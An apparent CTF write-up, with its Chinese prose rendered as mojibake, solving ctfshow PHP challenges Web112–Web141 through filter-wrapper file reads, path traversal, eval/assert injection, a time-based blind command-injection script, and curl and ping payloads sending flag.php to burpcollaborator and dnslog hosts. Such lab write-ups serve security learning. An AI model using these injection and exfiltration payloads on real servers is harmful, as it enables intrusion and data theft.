<h1 id="Web112"><a href="#Web112" class="headerlink" title="Web112"></a>Web112</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥ç›´æ¥ç”¨ä¸å¸¦ä»»ä½•è¿‡æ»¤å™¨çš„filterä¼ªåè®®</span><br><span class="line">file=php://filter/resource=flag.php</span><br><span class="line">ä¹Ÿå¯ä»¥ç”¨ä¸€äº›æ²¡æœ‰è¿‡æ»¤æ‰çš„ç¼–ç æ–¹å¼å’Œè½¬æ¢æ–¹å¼</span><br><span class="line">file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">file=compress.zlib://flag.php</span><br><span class="line">â†‘è¿™æ˜¯è¯»å–å‹ç¼©æµ</span><br><span class="line">file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br><span class="line">file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">â†‘è¿™æ˜¯ä¸¤ä½ä¸€åè½¬çš„è¯»å–æ–¹å¼</span><br></pre></td></tr></table></figure>

<h1 id="Web113"><a href="#Web113" class="headerlink" title="Web113"></a>Web113</h1><p>è¿™æ¥ç€ä¸Šé¢æŠŠfilterç¦æ‰äº†</p>
<p>åˆ©ç”¨ä¸Šä¸€é“é¢˜ç›®çš„payloadå¯ä»¥ç»§ç»­æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ç›®å½•æº¢å‡ºæ¥åš</p>
<p>inuxé‡Œ<code>/proc/self/root</code>æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>ls /proc/self/root</code>ï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹<br>å¤šæ¬¡é‡å¤åç»•è¿‡<code>is_file</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web114"><a href="#Web114" class="headerlink" title="Web114"></a>Web114</h1><p>æŠŠfilteråˆæ”¾å‡ºæ¥äº†ï¼Œç›´æ¥å†™å°±è¡Œ</p>
<h1 id="Web115"><a href="#Web115" class="headerlink" title="Web115"></a>Web115</h1><p>è¿™é¢˜éœ€è¦å†™ä¸€ä¸ªè„šæœ¬å»æ‰¾åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ï¼š<code>%0C %2B(+) - . 0 1 2 3 4 5 6 7 8 9</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payloadï¼š%0C36</span><br></pre></td></tr></table></figure>

<h1 id="Web123"><a href="#Web123" class="headerlink" title="Web123"></a>Web123</h1><p>æ­¤å¤„çš„phpç‰¹æ€§ï¼šåœ¨phpä¸­å˜é‡åå­—æ˜¯ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œæ‰€ä»¥ä¸è®ºç”¨postè¿˜æ˜¯getä¼ å…¥å˜é‡åçš„æ—¶å€™éƒ½å°†ç©ºæ ¼ã€+ã€ç‚¹ã€[è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ç”¨ä¸€ä¸ªç‰¹æ€§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå°±æ˜¯å½“[æå‰å‡ºç°åï¼Œåé¢çš„ç‚¹å°±ä¸ä¼šå†è¢«è½¬ä¹‰äº†ï¼Œsuch asï¼šCTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM</p>
<p>payloadï¼šCTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</p>
<h1 id="Web125"><a href="#Web125" class="headerlink" title="Web125"></a>Web125</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&quot;QUERY_STRING&quot;]  è·å–æŸ¥è¯¢ è¯­å¥ï¼Œå®ä¾‹ä¸­å¯çŸ¥ï¼Œè·å–çš„æ˜¯?åé¢çš„å€¼</span><br><span class="line">$_SERVER[&quot;REQUEST_URI&quot;]   è·å– http://localhost åé¢çš„å€¼ï¼ŒåŒ…æ‹¬/</span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;]   è·å–å½“å‰è„šæœ¬çš„è·¯å¾„ï¼Œå¦‚ï¼šindex.php</span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]      å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) # POST</span><br><span class="line">?$fl0g=flag_give_me; #GET</span><br><span class="line">CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])    #POST</span><br><span class="line">?1=flag.php		#GET</span><br></pre></td></tr></table></figure>

<p>ç°å°†å˜é‡fl0gèµ‹å€¼ï¼Œå†å»æ‰§è¡Œå‘½ä»¤</p>
<h1 id="Web126"><a href="#Web126" class="headerlink" title="Web126"></a>Web126</h1><p>å’Œä¸Šé¢˜åŸºæœ¬ä¸€æ ·çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() æ–­è¨€ï¼š</span><br><span class="line"></span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line"></span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line"></span><br><span class="line">å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« <span class="title function_ invoke__">assert</span>() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span><br><span class="line">å¯è§ï¼Œ<span class="keyword">eval</span>å’Œassertéƒ½å¯ä»¥å°†å­—ç¬¦å½“ä½œä»£ç æ‰§è¡Œï¼Œåªä¸è¿‡assertä¸éœ€è¦ä¸¥æ ¼éµä»è¯­æ³•ï¼Œæ¯”å¦‚è¯­å¥æœ«å°¾çš„åˆ†å·å¯ä¸åŠ </span><br><span class="line">?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">CTF_SHOW=<span class="number">6</span>&amp;CTF[SHOW.COM=<span class="number">6</span>&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h1 id="Web127"><a href="#Web127" class="headerlink" title="Web127"></a>Web127</h1><p>?ctf_show&#x3D;ilove36dä½†æ˜¯ä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†</p>
<p>è‡ªå·±å†™ä¸ªfuzzè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;æœªç¼–ç ï¼š&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;   ç»è¿‡ç¼–ç ï¼š&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨ç©ºæ ¼ã€ç‚¹ã€å·¦ä¸­æ‹¬å·ã€+æ¥è¢«è‡ªåŠ¨è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œç»è¿‡fuzzå¾—åˆ°ç©ºæ ¼ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç©ºæ ¼ç»è¿‡URLç¼–ç ç¡®æ˜¯+ï¼Œä½†æ˜¯%20ç¡®å®ç¬¦åˆè¯¥é¢˜ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç©ºæ ¼ + . [`ä¼šè¢«è½¬åŒ–ä¸º`_</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf%20show=ilove36d</span><br></pre></td></tr></table></figure>

<h1 id="Web128"><a href="#Web128" class="headerlink" title="Web128"></a>Web128</h1><p>æ–°çŸ¥è¯†ï¼š</p>
<p>gettext()å‡½æ•°æœ‰ä¸€ä¸ªåˆ«åï¼š<code>_ </code>           gettext()çš„ä½œç”¨å°±æ˜¯è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">_</span>()æ˜¯<span class="title function_ invoke__">gettext</span>()çš„æ‹“å±•å‡½æ•°</span><br><span class="line">åœ¨å¼€å¯ç›¸å…³è®¾å®šåï¼Œ<span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>)ç­‰ä»·äº<span class="title function_ invoke__">gettext</span>(<span class="string">&quot;666&quot;</span>)ï¼Œä¸”å°±è¿”å›å…¶ä¸­çš„å‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="number">666</span>);   <span class="comment">//è¾“å‡º 666</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>);		<span class="comment">//è¾“å‡º 666</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<h1 id="Web129"><a href="#Web129" class="headerlink" title="Web129"></a>Web129</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strpos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">stripos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">strripos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">strrpos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜éœ€è¦ä½¿ç”¨ç›®å½•ç©¿è¶Šå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ctfshow/../flag.php</span><br><span class="line">?f=/ctfshow/../../../../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web130"><a href="#Web130" class="headerlink" title="Web130"></a>Web130</h1><p>ç›´æ¥postä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure>

<h1 id="Web131"><a href="#Web131" class="headerlink" title="Web131"></a>Web131</h1><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>payloadï¼š<code>?f=ctfshow[]</code></p>
<h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><p>é‡‡ç”¨<code>æ•°ç»„</code>ç»•è¿‡çš„æ–¹æ³•ï¼Œ<code>striposå‡½æ•°</code>ä¼šè¿”å›<code>null</code>,<code>null!=false</code>,æ‰€ä»¥å¯ä»¥ç»•è¿‡striposå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f[]=666</span><br></pre></td></tr></table></figure>

<h4 id="æ–¹æ³•ä¸‰ï¼š"><a href="#æ–¹æ³•ä¸‰ï¼š" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š"></a>æ–¹æ³•ä¸‰ï¼š</h4><p>å›æº¯æ¬¡æ•°æº¢å‡ºå³å¯</p>
<p>å†™ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://510d4c1f-2643-4f0e-b2ff-2f62679bf384.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">response=requests.post(url=url,data=&#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;data&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h1 id="Web132"><a href="#Web132" class="headerlink" title="Web132"></a>Web132</h1><p>å¾ˆç®€å•çš„è¿™é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;true!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿”å›ç»“æœä¸ºtrue</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªéœ€è¦æ»¡è¶³åè€…å°±è¡Œï¼š<code>$username ===&quot;admin&quot;</code></p>
<p>åŒæ—¶æ»¡è¶³ä¸‹ä¸€ä¸ªifï¼š<code>$code == &#39;admin&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=1&amp;code=admin</span><br></pre></td></tr></table></figure>

<h1 id="Web133"><a href="#Web133" class="headerlink" title="Web133"></a>Web133</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æˆ‘ä»¬ä¼ é€’?F=`$F`;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤</span><br><span class="line">**é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**</span><br><span class="line">å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„`$F`;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°</span><br><span class="line">è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„`$F`;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯</span><br><span class="line">``$F`;+sleep 3`,å°±æ‰§è¡ŒæˆåŠŸ</span><br><span class="line">è¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?F=`$F `;+curl -X POST -F xx=@flag.php 6hokugw3tjr8vdj8f2yldiead1jt7i.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"># -X POST  æŒ‡å®š HTTP è¯·æ±‚çš„æ–¹æ³•ä¸º POST</span><br><span class="line"># å…¶ä¸­-F æ˜¯å¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚</span><br><span class="line"># xxæ˜¯ä¸Šä¼ æ–‡ä»¶çš„nameå€¼ï¼Œflag.phpå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ </span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨dnslog</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6d430dd8-2c69-4e3a-80e9-17df7cab12e0.challenge.ctf.show/?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.5c7zzo.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¿™ç§ç‰¹åˆ«å®¹æ˜“å¤±è´¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<h1 id="Web134"><a href="#Web134" class="headerlink" title="Web134"></a>Web134</h1><p>æˆ‘ä»¬å¯ä»¥ä¹‹é—´ä½¿ç”¨å˜é‡å»ç»•è¿‡å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>

<h1 id="Web135"><a href="#Web135" class="headerlink" title="Web135"></a>Web135</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨cpå‘½ä»¤å°±å¯ä»¥å®Œæˆäº†</p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨pingå‘½ä»¤å¤–å¸¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.qvnuu2.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯è¿™æ ·è¿˜æ˜¯å¾ˆå®¹æ˜“å‡ºä¸æ¥</p>
<h1 id="Web136"><a href="#Web136" class="headerlink" title="Web136"></a>Web136</h1><p>ç›´æ¥ä½¿ç”¨linuxçš„teeå‘½ä»¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /|tee 1 è®¿é—®1ä¸‹è½½å‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag payload: cat /f149_15_h3r3|tee 2 è®¿é—®ä¸‹è½½å°±OK</span><br></pre></td></tr></table></figure>

<h1 id="Web137"><a href="#Web137" class="headerlink" title="Web137"></a>Web137</h1><p>è¿™é¢˜ç›´æ¥è°ƒç”¨é™æ€ç±»å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<h1 id="Web138"><a href="#Web138" class="headerlink" title="Web138"></a>Web138</h1><p>åˆ©ç”¨call_user_funcçš„æ€§è´¨å³å¯ï¼Œæˆ‘ä»¬ä¼ é€’ä¸€ä¸ªæ•°ç»„è¿›å»ï¼Œä½¿å…¶è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">è°ƒç”¨classnameè¿™ä¸ªç±»é‡Œçš„sya_helloæ–¹æ³•</span><br><span class="line"></span><br><span class="line">array[0]=$classname  ç±»å</span><br><span class="line">array[1]=say_hello   say_hello()æ–¹æ³•</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>

<h1 id="Web139"><a href="#Web139" class="headerlink" title="Web139"></a>Web139</h1><p>è¿™é¢˜å°±ç¨å¾®æœ‰ç‚¹éš¾åº¦ï¼Œéœ€è¦ä½¿ç”¨ç›²æ³¨</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># url = &quot;http://7bbfdea8-0683-43fe-a382-62f9db7b00b5.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&quot;NR==&#123;&#125;\&quot;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># result = &quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># row = 6</span></span><br><span class="line"><span class="comment"># length = 20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># strings = &quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for r in range(1,row):</span></span><br><span class="line"><span class="comment">#     for c in range(1,length):</span></span><br><span class="line"><span class="comment">#         for s in strings:</span></span><br><span class="line"><span class="comment">#             target = url+payload.format(c,r,s)</span></span><br><span class="line"><span class="comment">#             try:</span></span><br><span class="line"><span class="comment">#                 requests.get(target,timeout=3)</span></span><br><span class="line"><span class="comment">#             except:</span></span><br><span class="line"><span class="comment">#                 result+=s</span></span><br><span class="line"><span class="comment">#                 print(result)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     result+=&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7bbfdea8-0683-43fe-a382-62f9db7b00b5.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        target = url+payload.<span class="built_in">format</span>(c,s)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(target,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result+=s</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<p>æœ€åå°±å¾—åˆ°äº†flag</p>
<h1 id="Web140"><a href="#Web140" class="headerlink" title="Web140"></a>Web140</h1><p><strong><code>0==â€œå­—ç¬¦ä¸²â€</code> è¿”å›çš„æ˜¯TRUE</strong></p>
<p>intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     å› ä¸º/var/www/html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1</span><br><span class="line">post f1=usleep&amp;f2=usleep</span><br><span class="line">post f1=gmdate&amp;f2=gmdate</span><br><span class="line">post f1=intval&amp;f2=intval</span><br></pre></td></tr></table></figure>

<h1 id="Web141"><a href="#Web141" class="headerlink" title="Web141"></a>Web141</h1><p>è¿™ä¸»è¦æ˜¯å¯ä»¥é€šè¿‡å–åç»•è¿‡</p>
<p>æ‹“å±•ï¼šå„ç§æ— æ•°å­—å­—æ¯ç»•è¿‡<a href="https://blog.csdn.net/miuzzx/article/details/109143413%E2%80%98">https://blog.csdn.net/miuzzx/article/details/109143413â€˜</a></p>
<p>ç»•è¿‡returnçš„æ–¹å¼ï¼š<br>phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();ç»“åˆå‡å·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚ï¼ˆä¸ä¸€å®šæ˜¯å‡å·ï¼Œè¿˜æœ‰åŠ ã€ä¹˜ã€é™¤å·ï¼Œè‹¥ç”¨åŠ å·ã€‚è¦ç”¨+ï¼Œè¦è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ˜¯ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä¸è¿›è¡Œç¼–ç ä¼šå½“ä½œç©ºæ ¼ï¼‰</p>
